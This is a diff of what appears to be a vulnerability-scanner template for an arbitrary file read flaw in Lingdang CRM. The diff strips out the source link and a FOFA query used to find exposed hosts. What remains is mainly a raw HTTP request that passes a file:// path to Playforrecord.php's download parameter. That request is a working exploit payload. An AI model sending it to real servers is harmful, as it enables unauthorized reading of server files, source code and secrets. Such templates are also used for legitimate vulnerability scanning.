@@ -3,12 +3,8 @@ info:
   name: 灵当CRM Playforrecord存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iguu2gs3m7rhevvq'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: iguu2gs3m7rhevvq
-    fofa: body="include/js/ldAjax.js"
 http:
 - raw:
   - 'GET /crm/modules/Accounts/Playforrecord.php?download=file:///D:/ldcrm/www/crm/modules/Accounts/Playforrecord.php HTTP/1.1
